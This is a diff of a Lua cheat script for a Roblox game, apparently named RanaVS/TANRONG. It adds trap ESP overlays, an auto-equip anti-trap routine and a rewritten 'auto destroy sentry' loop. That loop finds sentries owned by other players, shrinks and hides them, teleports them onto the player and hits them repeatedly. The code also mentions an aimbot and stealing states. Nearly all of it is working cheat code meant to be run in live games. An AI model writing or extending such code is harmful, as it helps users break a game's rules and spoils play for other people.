+		local enabled = on == true
+		if type(setAntiTrap) == "function" then
+			setAntiTrap(enabled)
+		else
+			St.antiTrap = enabled
+			St.antiTrapZeroM = enabled
+			if enabled and TrapESP.lastScan <= 0 then collectTrapCandidates() end
+			pcall(saveCfg)
+		end
+	end
+
+	-- Render distance text without creating per-trap Heartbeat connections.
+	TrapESP.visualConn = RunService.RenderStepped:Connect(function(deltaTime)
+		if not St.trapESP then return end
+		TrapESP.visualAccum = TrapESP.visualAccum + (tonumber(deltaTime) or 0)
+		if TrapESP.visualAccum < 0.10 then return end
+		TrapESP.visualAccum = 0
+		local char = LP.Character
+		local hrp = char and char:FindFirstChild("HumanoidRootPart")
+		if not hrp then return end
+		for trap,d in pairs(TrapESP.data) do
+			local pos = trapPosition(trap)
+			if not pos or not trap.Parent then
+				trapEspCleanup(trap)
+			else
+				if d.bb then
+					local label = d.bb:FindFirstChild("Distance")
+					if label then
+						local meters = math.max(0, math.floor((hrp.Position - pos).Magnitude * 10 + 0.5) / 10)
+						if isSubspaceTrap(trap) then
+							label.Text = "SUBSPACE • " .. tostring(meters) .. "M"
+							label.TextColor3 = Color3.fromRGB(240, 191, 66)
+							label.Visible = St.subspaceESP or St.trapDistanceESP
+						else
+							label.Text = "TRAP • " .. tostring(meters) .. "M"
+							label.TextColor3 = Color3.new(1, 1, 1)
+							label.Visible = St.trapDistanceESP
+						end
+					end
+				end
+				if d.hl then
+					d.hl.OutlineTransparency = St.trapOutlineESP and 0 or 1
+				end
+			end
+		end
+	end)
+
+	-- Incremental trap cache: a workspace-wide scan per new effect/object was
+	-- causing repeated FPS drops. Seed once; thereafter update only the changed object.
+	table.insert(TrapESP._conns, workspace.DescendantAdded:Connect(function(obj)
+		if not obj or (not obj:IsA("Model") and not obj:IsA("BasePart")) then return end
+		if isLocalCharacterObject(obj) then return end
+		local root = trapRootFromObject(obj)
+		if not root or not root.Parent then return end
+		TrapESP.candidates[root] = true
+		if St.trapESP and not TrapESP.data[root] then
+			task.defer(function()
+				if St.trapESP and root.Parent and not TrapESP.data[root] then trapEspSetup(root) end
+			end)
+		end
+	end))
+	table.insert(TrapESP._conns, workspace.DescendantRemoving:Connect(function(obj)
+		TrapESP.candidates[obj] = nil
+		if TrapESP.data[obj] then trapEspCleanup(obj) end
+	end))
+
+	local function antiTrapEquipAndInstantUnequip(reason)
+		if not AntiTrapState.enabled then return false end
+		local selectedToolName = AntiTrapState.gear
+		if not selectedToolName then return false end
+
+		local now = os.clock()
+		if now - AntiTrapState.lastEquip < ANTI_TRAP_COOLDOWN then return false end
+		AntiTrapState.lastEquip = now
+
+		local character = LP.Character
+		local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+		if not humanoid or humanoid.Health <= 0 then return false end
+
+		-- Resolve inventory on each real trigger. If the selected gear is not owned,
+		-- switch to an owned alternative instead of silently doing nothing.
+		local tool, resolvedGear = resolveAvailableAntiTrapTool(selectedToolName)
+		if not tool then return false end
+		if resolvedGear then
+			AntiTrapState.gear = resolvedGear
+			St.antiTrapGear = resolvedGear
+			selectedToolName = resolvedGear
+		end
+		local equipped = pcall(function()
+			humanoid:EquipTool(tool)
+		end)
+		if not equipped then return false end
+
+		AntiTrapState.lastEquipReason = reason
+		task.spawn(function()
+			pcall(function()
+				-- Give Roblox one simulation step to register the equip before activating it.
+				RunService.Heartbeat:Wait()
+				local activeCharacter = LP.Character
+				local activeHumanoid = activeCharacter and activeCharacter:FindFirstChildOfClass("Humanoid")
+				if not activeCharacter or not activeHumanoid or activeHumanoid.Health <= 0 then return end
+				if not tool or not tool.Parent then return end
+				if tool.Parent ~= activeCharacter then activeHumanoid:EquipTool(tool) end
+				tool:Activate()
+				task.wait(0.05)
+				activeHumanoid:UnequipTools()
+			end)
+		end)
+		return true
+	end
+
+	local function stopAntiTrap()
+		AntiTrapState.enabled = false
+		AntiTrapState.stuckTime = 0
+		AntiTrapState.lastPosition = nil
+		if AntiTrapState.conn then
+			pcall(function() AntiTrapState.conn:Disconnect() end)
+			AntiTrapState.conn = nil
+		end
+		_G.RanaVS_AntiTrapActive = false
+	end
+
+	local function startAntiTrap()
+		stopAntiTrap()
+		AntiTrapState.enabled = true
+		if St.antiTrapZeroM and TrapESP.lastScan <= 0 then collectTrapCandidates() end
+
+		AntiTrapState.conn = RunService.Heartbeat:Connect(function(deltaTime)
+			if not AntiTrapState.enabled then return end
+			if not AntiTrapState.gear then return end
+
+			local character = LP.Character
+			if not character then return end
+
+			local humanoid = character:FindFirstChildOfClass("Humanoid")
+			local root = character:FindFirstChild("HumanoidRootPart")
+			if not humanoid or not root or humanoid.Health <= 0 then return end
+
+			-- Full Anti trampa movement detector.
+			if not AntiTrapState.lastPosition then
+				AntiTrapState.lastPosition = root.Position
+			else
+				local tryingToMove = humanoid.MoveDirection.Magnitude > 0.05
+				local distance = (root.Position - AntiTrapState.lastPosition).Magnitude
+				local actuallyMoving = distance > ANTI_TRAP_MOVEMENT_THRESHOLD
+
+				if tryingToMove and not actuallyMoving then
+					AntiTrapState.stuckTime += deltaTime
+				else
+					AntiTrapState.stuckTime = 0
+				end
+				AntiTrapState.lastPosition = root.Position
+
+				if AntiTrapState.stuckTime >= ANTI_TRAP_CHECK_TIME then
+					AntiTrapState.stuckTime = 0
+					if (os.clock() - AntiTrapState.lastEquip) >= ANTI_TRAP_COOLDOWN then
+						task.spawn(antiTrapEquipAndInstantUnequip, "STUCK")
+					end
+				end
+			end
+
+			-- ESP trap 0M trigger: auto-equip when a recognized trap is at contact range.
+			if St.antiTrapZeroM and (os.clock() - AntiTrapState.lastZeroMScan) >= 0.10 then
+				AntiTrapState.lastZeroMScan = os.clock()
+				local trap, distance = nearestTrap()
+				if trap and distance <= ANTI_TRAP_ZERO_M_EPSILON then
+					if (os.clock() - AntiTrapState.lastTrapEquip) >= ANTI_TRAP_COOLDOWN then
+						AntiTrapState.lastTrapEquip = os.clock()
+						task.spawn(antiTrapEquipAndInstantUnequip, isSubspaceTrap(trap) and "SUBSPACE_0M" or "TRAP_0M")
+					end
+				end
+			end
+		end)
+
+		_G.RanaVS_AntiTrapActive = true
+	end
+
+	function setAntiTrap(on)
+		local enable = on == true
+		-- One master state: Player toggle, mobile Anti Trap button, and ESP Auto Equip 0M.
+		St.antiTrap = enable
+		St.antiTrapZeroM = enable
+		if enable then
+			-- Immediately detect which supported gear is in Backpack/Character.
+			-- Preserve the selected item when owned; otherwise auto-select an available one.
+			resolveAvailableAntiTrapTool(AntiTrapState.gear)
+			startAntiTrap()
+		else
+			stopAntiTrap()
+		end
+		pcall(saveCfg)
+		if ToggleRefs and ToggleRefs.antiTrap and ToggleRefs.antiTrap.setVisual then
+			pcall(ToggleRefs.antiTrap.setVisual, enable)
+		end
+		if ToggleRefs and ToggleRefs.antiTrapZeroM and ToggleRefs.antiTrapZeroM.setVisual then
+			pcall(ToggleRefs.antiTrapZeroM.setVisual, enable)
+		end
+		pcall(function()
+			if _G.RanaVSRefreshAntiTrapBtn then _G.RanaVSRefreshAntiTrapBtn() end
+			if _G.TANRONGRefreshAntiTrapBtn then _G.TANRONGRefreshAntiTrapBtn() end
+			if _G.RanaVSRefreshAntiTrapGearUI then _G.RanaVSRefreshAntiTrapGearUI() end
+		end)
+	end
+
+	function setAntiTrapGear(name)
+		name = tostring(name or "")
+		for _, gearName in ipairs(ANTI_TRAP_GEARS) do
+			if name == gearName then
+				AntiTrapState.gear = gearName
+				St.antiTrapGear = gearName
+				AntiTrapState.lastPosition = nil
+				-- If this gear is not in the current inventory, fall back immediately.
+				local tool, availableName = resolveAvailableAntiTrapTool(gearName)
+				if tool and availableName then
+					AntiTrapState.gear = availableName
+					St.antiTrapGear = availableName
+				end
+				pcall(saveCfg)
+				task.defer(function()
+					if _G.RanaVSRefreshAntiTrapGearUI then pcall(_G.RanaVSRefreshAntiTrapGearUI) end
+				end)
+				return true
+			end
+		end
+		return false
+	end
+
+	function getAntiTrapToolMatch()
+		local tool, availableName = resolveAvailableAntiTrapTool(AntiTrapState.gear)
+		if tool and availableName then
+			AntiTrapState.gear = availableName
+			St.antiTrapGear = availableName
+		end
+		return tool
+	end
+
+	_G.RanaVSSetAntiTrap = setAntiTrap
+	_G.RanaVSSetAntiTrapGear = setAntiTrapGear
+	_G.RanaVSAntiTrapGears = ANTI_TRAP_GEARS
+	_G.RanaVSFindAntiTrapTool = getAntiTrapToolMatch
+	_G.RanaVSHasAntiTrapGear = function(name) return antiTrapFindTool(tostring(name or "")) ~= nil end
+	_G.RanaVSNearestTrap = nearestTrap
+	_G.RanaVSSetTrapESP = setTrapESP
+	_G.RanaVSSetTrapDistanceESP = setTrapDistanceESP
+	_G.RanaVSSetTrapOutlineESP = setTrapOutlineESP
+	_G.RanaVSSetSubspaceESP = setSubspaceESP
+	_G.RanaVSSetTrapScanRange = setTrapScanRange
+	_G.RanaVSSetAntiTrapZeroM = setAntiTrapZeroM
+
+	LP.CharacterAdded:Connect(function()
+		AntiTrapState.lastPosition = nil
+		AntiTrapState.stuckTime = 0
+	end)
+
+	-- Initialize trap cache without forcing the UI/ESP on.
+	task.defer(function()
+		pcall(collectTrapCandidates)
+		if St.trapESP then pcall(refreshTrapVisuals) end
+	end)
+end
+
 ----------------------------------------------------------------
 -- TOOL AIMBOT (TANRONG full) — LUÔN BẬT
 ----------------------------------------------------------------
@@ -3825,172 +5001,428 @@ end
 local InfJump = { enabled = false, conn = nil, last = 0 }
 -- (InfJump moved above with BloodHounds speed)
 
--- AUTO DESTROY SENTRY (full from AutoDestroyTurret)
-----------------------------------------------------------------
-local GTurret = { AutoDestroyTurret = false }
-local turretBusy = setmetatable({}, { __mode = "k" })
-local turretQueued = setmetatable({}, { __mode = "k" })
-local turretCD = setmetatable({}, { __mode = "k" })
-local activeTurretAtk = 0
-function isEnemyTurret(obj)
-	if not obj or not obj:IsA("BasePart") then return false end
-	local name, nameLower = obj.Name, obj.Name:lower()
-	local ownerId = name:match("^Sentry_(%d+)$") or name:match("^sentry_(%d+)$")
-	if not ownerId then
-ownerId = name:match("^CandySentry_(%d+)$") or name:match("^Candy_Sentry_(%d+)$")
-or name:match("^candy_sentry_(%d+)$") or nameLower:match("^candy[_%-]?sentry_(%d+)$")
-	end
-	if not ownerId and nameLower:find("candy") and nameLower:find("sentry") then
-ownerId = name:match("(%d+)$")
-	end
-	if not ownerId then ownerId = name:match("^[Tt]urret_(%d+)$") end
-	if not ownerId and nameLower:find("sentry") then ownerId = name:match("(%d+)$") end
-	return ownerId ~= nil and tostring(ownerId) ~= tostring(LP.UserId)
+-- AUTO DESTROY V2 — Chilli target/equip/attack logic with drop-resume recovery.
+-- Kept in its own scope so it does not consume the main script's local-variable limit.
+do
+    if type(_G.__LuaVeilRDestroySentryCleanup) == "function" then
+        pcall(_G.__LuaVeilRDestroySentryCleanup)
+    end
+
+    local autoDestroyEnabled = false
+    local sentryGeneration = 0
+    local sentryScanGeneration = 0
+    local sentryConnection = nil
+    local stateConnections = {}
+    local trackedSentries = {}
+    local savedSentryParts = {}
+    local previousTool = nil
+    local activeBat = nil
+    local lastBatActivation = 0
+    local sentryScanInProgress = false
+    local sentryRescanPending = false
+    local TARGET_LOOP_INTERVAL = 0.03
+    local INITIAL_SCAN_BATCH = 200
+    local RESCAN_INTERVAL = 2.0
+    local lastRescanAt = 0
+
+    local basePartCache = setmetatable({}, { __mode = "k" })
+    local setupReadyCache = setmetatable({}, { __mode = "k" })
+    local setupReadyRetryAt = setmetatable({}, { __mode = "k" })
+    local timeLabelCache = setmetatable({}, { __mode = "k" })
+    local timeLabelRetryAt = setmetatable({}, { __mode = "k" })
+    local TARGET_PART_SIZE = Vector3.new(10, 10, 10)
+
+    local function getSentryOwnerId(name)
+        local nameLower = tostring(name or ""):lower()
+        local ownerId = nameLower:match("^sentry_(%d+)$")
+        if not ownerId then
+            ownerId = nameLower:match("^candysentry_(%d+)$")
+                or nameLower:match("^candy_sentry_(%d+)$")
+                or nameLower:match("^candy%-sentry_(%d+)$")
+        end
+        if not ownerId and nameLower:find("candy", 1, true) and nameLower:find("sentry", 1, true) then
+            ownerId = nameLower:match("(%d+)$")
+        end
+        if not ownerId then
+            ownerId = nameLower:match("^turret_(%d+)$")
+        end
+        if not ownerId and nameLower:find("sentry", 1, true) then
+            ownerId = nameLower:match("(%d+)$")
+        end
+        return ownerId
+    end
+
+    local function isTargetSentry(obj)
+        if not obj or not (obj:IsA("Model") or obj:IsA("BasePart")) then
+            return false
+        end
+        local ownerId = getSentryOwnerId(obj.Name)
+        return ownerId ~= nil and tostring(ownerId) ~= tostring(LP.UserId)
+    end
+
+    local function getSentryPart(obj)
+        if not obj or not obj.Parent then return nil end
+        if obj:IsA("BasePart") then return obj end
+        local cached = basePartCache[obj]
+        if cached and cached.Parent and cached:IsDescendantOf(obj) then
+            return cached
+        end
+        local part = obj:FindFirstChildWhichIsA("BasePart", true)
+        basePartCache[obj] = part
+        return part
+    end
+
+    local function getSentryTimeLabel(sentry)
+        if not sentry or not sentry.Parent then return nil end
+        local cached = timeLabelCache[sentry]
+        if cached and cached.Parent and cached:IsDescendantOf(sentry) then
+            return cached
+        end
+        local now = os.clock()
+        if (timeLabelRetryAt[sentry] or 0) > now then return nil end
+
+        local setupFrame = sentry:FindFirstChild("SetupFrame")
+        local mainFrame = setupFrame and setupFrame:FindFirstChild("MainFrame")
+        local timeLabel = mainFrame and mainFrame:FindFirstChild("Time")
+        if timeLabel and timeLabel:IsA("TextLabel") then
+            timeLabelCache[sentry] = timeLabel
+            return timeLabel
+        end
+        for _, descendant in ipairs(sentry:GetDescendants()) do
+            if descendant:IsA("TextLabel") then
+                local labelName = descendant.Name:lower()
+                if labelName == "time" or labelName == "timer" or labelName == "countdown" then
+                    timeLabelCache[sentry] = descendant
+                    return descendant
+                end
+            end
+        end
+        timeLabelRetryAt[sentry] = now + 0.5
+        return nil
+    end
+
+    local function sentryIsReady(sentry)
+        if not sentry or not sentry.Parent or not isTargetSentry(sentry) then return false end
+        local now = os.clock()
+        local readyObject = setupReadyCache[sentry]
+        if not (readyObject and readyObject.Parent and readyObject:IsDescendantOf(sentry)) then
+            if (setupReadyRetryAt[sentry] or 0) > now then return false end
+            readyObject = sentry:FindFirstChild("SetupReady", true)
+            if not readyObject then
+                setupReadyRetryAt[sentry] = now + 0.5
+                return false
+            end
+            setupReadyCache[sentry] = readyObject
+        end
+
+        local timeLabel = getSentryTimeLabel(sentry)
+        if timeLabel then
+            local ok, labelText = pcall(function() return timeLabel.Text end)
+            if not ok then return false end
+            labelText = tostring(labelText or ""):gsub("^%s+", ""):gsub("%s+$", "")
+            if labelText == "" then return false end
+            return labelText:match("^%d+%s*[sS]!?$") ~= nil or labelText:match("^%d+$") ~= nil
+        end
+        return true
+    end
+
+    local function findSentryBat(character)
+        local held = character and character:FindFirstChildWhichIsA("Tool")
+        if held and held.Name:lower():find("bat", 1, true) then return held end
+        local backpack = LP:FindFirstChildOfClass("Backpack")
+        if not backpack then return nil end
+        for _, child in ipairs(backpack:GetChildren()) do
+            if child:IsA("Tool") and child.Name:lower():find("bat", 1, true) then
+                return child
+            end
+        end
+        return nil
+    end
+
+    local function markToolSwitchCooldown(seconds)
+        local chilliCooldown = rawget(_G, "fn3")
+        if type(chilliCooldown) == "function" then
+            pcall(chilliCooldown, seconds)
+        end
+    end
+
+    local function restoreHeldTool()
+        local toolToRestore = previousTool
+        local batTool = activeBat
+        previousTool = nil
+        activeBat = nil
+        if not toolToRestore or not toolToRestore.Parent then return end
+        local character = LP.Character
+        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+        local backpack = LP:FindFirstChildOfClass("Backpack")
+        if not character or not humanoid or humanoid.Health <= 0
+            or (toolToRestore.Parent ~= character and toolToRestore.Parent ~= backpack) then
+            return
+        end
+        local held = character:FindFirstChildWhichIsA("Tool")
+        if held == toolToRestore then return end
+        if held and held ~= batTool then return end
+        markToolSwitchCooldown(0.5)
+        pcall(function() humanoid:EquipTool(toolToRestore) end)
+    end
+
+    local function restoreSentryParts()
+        for part, oldState in pairs(savedSentryParts) do
+            if part and part.Parent then
+                pcall(function()
+                    part.CanCollide = oldState.CanCollide
+                    part.Transparency = oldState.Transparency
+                    part.Size = oldState.Size
+                end)
+            end
+            savedSentryParts[part] = nil
+        end
+    end
+
+    local function prepareSentryPart(part)
+        if not part or not part.Parent then return end
+        if not savedSentryParts[part] then
+            savedSentryParts[part] = {
+                CanCollide = part.CanCollide,
+                Transparency = part.Transparency,
+                Size = part.Size,
+            }
+        end
+        pcall(function()
+            if part.CanCollide then part.CanCollide = false end
+            if part.Transparency ~= 1 then part.Transparency = 1 end
+            if part.Size ~= TARGET_PART_SIZE then part.Size = TARGET_PART_SIZE end
+        end)
+    end
+
+    local function shouldPauseSentryAttack()
+        return LP:GetAttribute("Stealing") == true
+            or LP:GetAttribute("ChilliTpMoving") == true
+            or LP:GetAttribute("Teleporting") == true
+    end
+
+    local function refreshTrackedSentries(runGeneration)
+        if not autoDestroyEnabled or runGeneration ~= sentryGeneration then return end
+        if sentryScanInProgress then
+            sentryRescanPending = true
+            return
+        end
+        sentryScanGeneration += 1
+        local scanGeneration = sentryScanGeneration
+        sentryScanInProgress = true
+        lastRescanAt = os.clock()
+
+        task.spawn(function()
+            for sentry in pairs(trackedSentries) do
+                if not sentry or not sentry.Parent then trackedSentries[sentry] = nil end
+            end
+            local stack = { workspace }
+            local processed = 0
+            while #stack > 0 do
+                if not autoDestroyEnabled or runGeneration ~= sentryGeneration
+                    or scanGeneration ~= sentryScanGeneration then
+                    break
+                end
+                local current = stack[#stack]
+                stack[#stack] = nil
+                local okChildren, children = pcall(function() return current:GetChildren() end)
+                if okChildren and children then
+                    for _, descendant in ipairs(children) do
+                        if isTargetSentry(descendant) then trackedSentries[descendant] = true end
+                        stack[#stack + 1] = descendant
+                        processed += 1
+                        if processed % INITIAL_SCAN_BATCH == 0 then task.wait() end
+                        if not autoDestroyEnabled or runGeneration ~= sentryGeneration
+                            or scanGeneration ~= sentryScanGeneration then
+                            break
+                        end
+                    end
+                end
+            end
+            if scanGeneration == sentryScanGeneration then
+                sentryScanInProgress = false
+                if sentryRescanPending and autoDestroyEnabled and runGeneration == sentryGeneration then
+                    sentryRescanPending = false
+                    refreshTrackedSentries(runGeneration)
+                end
+            end
+        end)
+    end
+
+    local function processNearestSentry()
+        if shouldPauseSentryAttack() then
+            restoreHeldTool()
+            return false
+        end
+        local character = LP.Character
+        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+        local root = character and character:FindFirstChild("HumanoidRootPart")
+        if not humanoid or humanoid.Health <= 0 or not root then return false end
+
+        local nearestSentry, nearestPart = nil, nil
+        local nearestDistance = math.huge
+        for sentry in pairs(trackedSentries) do
+            if not sentry or not sentry.Parent then
+                trackedSentries[sentry] = nil
+            elseif sentryIsReady(sentry) then
+                local part = getSentryPart(sentry)
+                if part then
+                    local distance = (root.Position - part.Position).Magnitude
+                    if distance < nearestDistance then
+                        nearestDistance = distance
+                        nearestSentry = sentry
+                        nearestPart = part
+                    end
+                end
+            end
+        end
+
+        if not nearestSentry or not nearestSentry.Parent or not nearestPart or not nearestPart.Parent then
+            restoreHeldTool()
+            return false
+        end
+
+        pcall(function()
+            prepareSentryPart(nearestPart)
+            nearestPart.CFrame = root.CFrame
+        end)
+
+        local now = os.clock()
+        if now - lastBatActivation >= 0.01 then
+            local bat = findSentryBat(character)
+            if bat then
+                if bat.Parent ~= character then
+                    local held = character:FindFirstChildWhichIsA("Tool")
+                    if held and held ~= bat and not previousTool then previousTool = held end
+                    activeBat = bat
+                    markToolSwitchCooldown(1)
+                    pcall(function() humanoid:EquipTool(bat) end)
+                end
+                if bat.Parent == character then
+                    pcall(function() bat:Activate() end)
+                    lastBatActivation = now
+                end
+            end
+        end
+        return true
+    end
+
+    local function disconnectStateConnections()
+        for _, connection in ipairs(stateConnections) do
+            pcall(function() connection:Disconnect() end)
+        end
+        table.clear(stateConnections)
+    end
+
+    local function stopChilliAutoDestroy()
+        autoDestroyEnabled = false
+        sentryGeneration += 1
+        sentryScanGeneration += 1
+        sentryScanInProgress = false
+        sentryRescanPending = false
+        if sentryConnection then
+            pcall(function() sentryConnection:Disconnect() end)
+            sentryConnection = nil
+        end
+        disconnectStateConnections()
+        table.clear(trackedSentries)
+        lastBatActivation = 0
+        restoreHeldTool()
+        restoreSentryParts()
+        basePartCache = setmetatable({}, { __mode = "k" })
+        setupReadyCache = setmetatable({}, { __mode = "k" })
+        setupReadyRetryAt = setmetatable({}, { __mode = "k" })
+        timeLabelCache = setmetatable({}, { __mode = "k" })
+        timeLabelRetryAt = setmetatable({}, { __mode = "k" })
+    end
+
+    local function requestRecoveryRescan(runGeneration)
+        task.delay(0.12, function()
+            if not autoDestroyEnabled or runGeneration ~= sentryGeneration then return end
+            if not shouldPauseSentryAttack() then
+                refreshTrackedSentries(runGeneration)
+                task.delay(0.65, function()
+                    if autoDestroyEnabled and runGeneration == sentryGeneration
+                        and not shouldPauseSentryAttack() then
+                        refreshTrackedSentries(runGeneration)
+                    end
+                end)
+            end
+        end)
+    end
+
+    local function startChilliAutoDestroy()
+        if autoDestroyEnabled then return end
+        stopChilliAutoDestroy()
+        autoDestroyEnabled = true
+        sentryGeneration += 1
+        local runGeneration = sentryGeneration
+
+        sentryConnection = workspace.DescendantAdded:Connect(function(descendant)
+            if autoDestroyEnabled and runGeneration == sentryGeneration and isTargetSentry(descendant) then
+                trackedSentries[descendant] = true
+            end
+        end)
+
+        -- Resume automatically after carry/drop/teleport attributes change.
+        for _, attributeName in ipairs({ "Stealing", "ChilliTpMoving", "Teleporting", "ChilliDropBrainrotActive" }) do
+            local ok, signal = pcall(function() return LP:GetAttributeChangedSignal(attributeName) end)
+            if ok and signal then
+                stateConnections[#stateConnections + 1] = signal:Connect(function()
+                    requestRecoveryRescan(runGeneration)
+                end)
+            end
+        end
+        stateConnections[#stateConnections + 1] = LP.CharacterAdded:Connect(function()
+            task.delay(0.25, function()
+                if autoDestroyEnabled and runGeneration == sentryGeneration then
+                    refreshTrackedSentries(runGeneration)
+                end
+            end)
+        end)
+
+        refreshTrackedSentries(runGeneration)
+        processNearestSentry()
+
+        task.spawn(function()
+            while autoDestroyEnabled and runGeneration == sentryGeneration and LP.Parent do
+                local paused = shouldPauseSentryAttack()
+                if not paused and not sentryScanInProgress then
+                    processNearestSentry()
+                elseif paused then
+                    restoreHeldTool()
+                end
+
+                -- Safety rescan: catches sentries renamed/finished setup while already in Workspace,
+                -- so dropping a Brainrot does not require another placement to retrigger detection.
+                if not paused and not sentryScanInProgress
+                    and os.clock() - lastRescanAt >= RESCAN_INTERVAL then
+                    refreshTrackedSentries(runGeneration)
+                end
+                task.wait(TARGET_LOOP_INTERVAL)
+            end
+        end)
+    end
+
+    _G.__LuaVeilRDestroySentryCleanup = stopChilliAutoDestroy
+
+    function setDestroySentry(on)
+        local enabled = (on == true)
+        St.destroySentry = enabled
+        if enabled then
+            startChilliAutoDestroy()
+        else
+            stopChilliAutoDestroy()
+        end
+        if ToggleRefs and ToggleRefs.destroySentry and ToggleRefs.destroySentry.setVisual then
+            pcall(ToggleRefs.destroySentry.setVisual, enabled)
+        end
+        if _G.TANRONGRefreshSentryBtn then pcall(_G.TANRONGRefreshSentryBtn) end
+        if _G.RanaVSRefreshSentryBtn then pcall(_G.RanaVSRefreshSentryBtn) end
+        pcall(saveCfg)
+    end
 end
-function setTurretNoClip(turret)
-	if not isEnemyTurret(turret) then return end
-	pcall(function()
-turret.CanCollide = false
-turret.Anchored = true
-turret.AssemblyLinearVelocity = Vector3.zero
-turret.AssemblyAngularVelocity = Vector3.zero
-	end)
-end
-function getTurretTimeLabel(turret)
-	if not turret or not turret.Parent then return nil end
-	local sf = turret:FindFirstChild("SetupFrame")
-	local mf = sf and sf:FindFirstChild("MainFrame")
-	local tl = mf and mf:FindFirstChild("Time")
-	if tl and tl:IsA("TextLabel") then return tl end
-	for _, d in ipairs(turret:GetDescendants()) do
-if d:IsA("TextLabel") then
-local n = d.Name:lower()
-if n == "time" or n == "timer" or n == "countdown" then return d end
-end
-	end
-	return nil
-end
-function shouldAttackTurret(turret)
-	if LP:GetAttribute("Stealing") ~= nil then return false end
-	if not isEnemyTurret(turret) then return false end
-	setTurretNoClip(turret)
-	local timeLabel = getTurretTimeLabel(turret)
-	if timeLabel then
-local ok, text = pcall(function() return timeLabel.Text end)
-if not ok then return false end
-text = tostring(text or ""):gsub("^%s+", ""):gsub("%s+$", "")
-if text == "" then return false end
-if string.find(text, "^%d+%s*[sS]!?$") or string.find(text, "^%d+$") then return true end
-return false
-	end
-	return true
-end
-function bringTurretInFront(turret, hrp)
-	if not turret or not hrp then return end
-	local forward = hrp.CFrame.LookVector
-	local targetPos = hrp.Position + forward * 2.8 + Vector3.new(0, 1.15, 0)
-	pcall(function()
-turret.AssemblyLinearVelocity = Vector3.zero
-turret.CFrame = CFrame.lookAt(targetPos, targetPos + forward)
-	end)
-end
-function findBat()
-	local char = LP.Character
-	if not char then return nil end
-	local bat = char:FindFirstChild("Bat") or LP.Backpack:FindFirstChild("Bat")
-	if bat then return bat end
-	for _, t in ipairs(char:GetChildren()) do
-if t:IsA("Tool") and t.Name:lower():find("bat") then return t end
-	end
-	for _, t in ipairs(LP.Backpack:GetChildren()) do
-if t:IsA("Tool") and t.Name:lower():find("bat") then return t end
-	end
-	return nil
-end
-function ensureBat(hum, char)
-	local held = char:FindFirstChildOfClass("Tool")
-	if held and (held.Name == "Bat" or held.Name:lower():find("bat")) then return held end
-	local bat = findBat()
-	if not bat then return nil end
-	pcall(function() hum:EquipTool(bat) end)
-	return char:FindFirstChild("Bat") or bat
-end
-function attackTurret(turret)
-	local now = os.clock()
-	if turretBusy[turret] or turretQueued[turret] then return end
-	if activeTurretAtk >= 2 then return end
-	if not shouldAttackTurret(turret) then return end
-	if (turretCD[turret] or 0) > now then return end
-	turretQueued[turret] = true
-	turretCD[turret] = now + 0.15
-	task.spawn(function()
-turretQueued[turret] = nil
-if activeTurretAtk >= 2 or turretBusy[turret] or not shouldAttackTurret(turret) then return end
-activeTurretAtk = activeTurretAtk + 1
-turretBusy[turret] = true
-pcall(function()
-local attempts, batReady = 0, false
-while attempts < 18 and GTurret.AutoDestroyTurret do
-if not turret or not turret.Parent or not shouldAttackTurret(turret) then break end
-local char = LP.Character
-local hrp = char and char:FindFirstChild("HumanoidRootPart")
-local hum = char and char:FindFirstChildOfClass("Humanoid")
-if not hrp or not hum or hum.Health <= 0 then break end
-local okD, dist = pcall(function() return (turret.Position - hrp.Position).Magnitude end)
-if okD and dist > 250 then break end
-setTurretNoClip(turret)
-bringTurretInFront(turret, hrp)
-local bat
-if not batReady then
-bat = ensureBat(hum, char)
-batReady = bat ~= nil
-else
-bat = char:FindFirstChild("Bat") or findBat()
-local held = char:FindFirstChildOfClass("Tool")
-if held and held.Name ~= "Bat" and not held.Name:lower():find("bat") then break end
-end
-if bat then pcall(function() bat:Activate() end) end
-attempts = attempts + 1
-task.wait(0.045)
-end
-end)
-turretBusy[turret] = nil
-activeTurretAtk = math.max(0, activeTurretAtk - 1)
-	end)
-end
-workspace.DescendantAdded:Connect(function(obj)
-	if isEnemyTurret(obj) then setTurretNoClip(obj) end
-	if GTurret.AutoDestroyTurret and shouldAttackTurret(obj) then task.defer(attackTurret, obj) end
-end)
-task.spawn(function()
-	while task.wait(0.25) do
-if GTurret.AutoDestroyTurret then
-local pending = {}
-for _, obj in ipairs(workspace:GetDescendants()) do
-if isEnemyTurret(obj) then
-setTurretNoClip(obj)
-if shouldAttackTurret(obj) and not turretBusy[obj] then
-table.insert(pending, obj)
-end
-end
-end
-local char = LP.Character
-local hrp = char and char:FindFirstChild("HumanoidRootPart")
-if hrp and #pending > 0 then
-table.sort(pending, function(a, b)
-return (a.Position - hrp.Position).Magnitude < (b.Position - hrp.Position).Magnitude
-end)
-for i = 1, math.min(2, #pending) do attackTurret(pending[i]) end
-end
-end
-	end
-end)
-function setDestroySentry(on)
-	St.destroySentry = on and true or false
-	GTurret.AutoDestroyTurret = St.destroySentry
-	if _G.TANRONGRefreshSentryBtn then _G.TANRONGRefreshSentryBtn() end
-	saveCfg()
-end
+
 
 ----------------------------------------------------------------
 -- SPAM LASER CAPE / PAINTBALL (activate only, no auto-equip)
@@ -4310,6 +5742,22 @@ Top.ZIndex = 15
 Top.Active = true
 Top.Parent = Main
 corner(Top, 14)
+local topBarGradient = Instance.new("UIGradient")
+topBarGradient.Name = "TopBarMotion"
+topBarGradient.Rotation = 0
+topBarGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(24, 12, 18)),
+    ColorSequenceKeypoint.new(0.45, Color3.fromRGB(48, 15, 24)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(18, 18, 28)),
+})
+topBarGradient.Parent = Top
+task.spawn(function()
+    local t0 = tick()
+    while topBarGradient and topBarGradient.Parent do
+        topBarGradient.Offset = Vector2.new(math.sin((tick() - t0) * 0.7) * 0.45, 0)
+        task.wait(0.04)
+    end
+end)
 local topFix = Instance.new("Frame")
 topFix.Size = UDim2.new(1, 0, 0, 12)
 topFix.Position = UDim2.new(0, 0, 1, -12)
@@ -4449,16 +5897,34 @@ local pageCounter = makePage("Counter")
 local pageSet = makePage("Settings")
 local pageKeys = makePage("Keybinds")
 
+local activeTabName = nil
 function setTab(name)
-	for n, p in pairs(pages) do
-p.Visible = (n == name)
-p.ZIndex = 3
-	end
-	for n, b in pairs(tabBtns) do
-local on = n == name
-b.BackgroundColor3 = on and C.accent or C.card
-b.TextColor3 = on and Color3.fromRGB(30, 20, 30) or C.text
-	end
+    local selected = pages[name]
+    if not selected then return end
